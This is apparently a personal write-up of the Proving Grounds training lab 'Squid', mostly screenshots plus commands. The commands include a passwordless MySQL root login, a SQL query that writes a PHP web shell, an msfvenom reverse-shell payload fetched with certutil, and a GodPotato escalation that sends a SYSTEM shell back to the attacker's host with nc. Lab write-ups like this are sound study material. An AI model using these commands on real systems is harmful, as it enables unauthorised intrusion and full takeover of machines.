---
title: Squid
date: 2026-01-14T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - php
  - winpeas
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Squid"
---

![](Screenshot%202025-12-28%20at%2008.00.22.png)

![](Screenshot%202025-12-28%20at%2008.00.46.png)

https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid

![](Screenshot%202025-12-28%20at%2011.55.42.png)

![](Screenshot%202025-12-28%20at%2011.55.04.png)

It was actually 8080 that I needed. 

![](Screenshot%202025-12-28%20at%2012.51.37.png)



![](Screenshot%202025-12-28%20at%2012.52.41.png)

default username is: `root`

no password:

![](Screenshot%202025-12-28%20at%2013.20.52.png)



`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp/www/cmd.php'`

![](Screenshot%202025-12-28%20at%2014.29.03.png)

![](Screenshot%202025-12-28%20at%2014.37.49.png)

![](Screenshot%202025-12-28%20at%2014.33.40.png)

![](Screenshot%202025-12-28%20at%2014.04.28.png)

Once we have a foothold we need to create a reverse shell. 

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.206 LPORT=80 -f exe -o reverse.exe`

Setup your server `python -m http.server 80` in the folder you have your reverse.exe file.  

`http://192.168.197.189:8080/cmd.php?cmd=certutil -urlcache -http://192.168.45.206:80/reverse.exe reverse.exe`

![](Screenshot%202025-12-29%20at%2009.29.54.png)

Set up the listener: 

`rlwrap nc -lvnp 80`

Then to execute: 

`http://192.168.197.189:8080/cmd.php?cmd=rev.exe`

You should then see your reverse shell.

![](Screenshot%202025-12-29%20at%2011.32.19.png)

Now we'll use our shell to manually enumerate. 
`whoami`
	`whoami /priv`
	`whoami /all`
	`systeminfo`

We can also move WinPEAS over as well
	`certutil  -urlcache -f http://192.168.45.206:81/winPEASx64.exe winp.exe`

![](Screenshot%202025-12-29%20at%2014.27.06.png)

![](Screenshot%202025-12-29%20at%2011.39.19.png)

![](Screenshot%202025-12-29%20at%2014.28.52.png)

![](Screenshot%202025-12-29%20at%2014.30.46.png)

We now know that our system is NT 10.0.17763, x64 arch, SeImpersonatePriviledge is enabled.

This should mean that GodPotato may get us our priv escalation. 

Download GodpPotato from github:
Set up the server:
	python -m http.server 81
In your reverse shell:

`certutil -f -urlcache http://192.168.45.206:81/GodPotato-NET4.exe god.exe`

Set up your listener:

`rlwrap nc -lnvp 81`

Using GodPotato we want to set up another nc reverse shell using the admin account. 

`god.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.206 81`

![](Screenshot%202025-12-29%20at%2014.41.30.png)

GodPotato will execute this command as the NT AUTHORITY\SYSTEM user. 

![](Screenshot%202025-12-29%20at%2014.43.12.png)

No way that I would have got this without help. It was the first time I've seen proxies. Much too learn.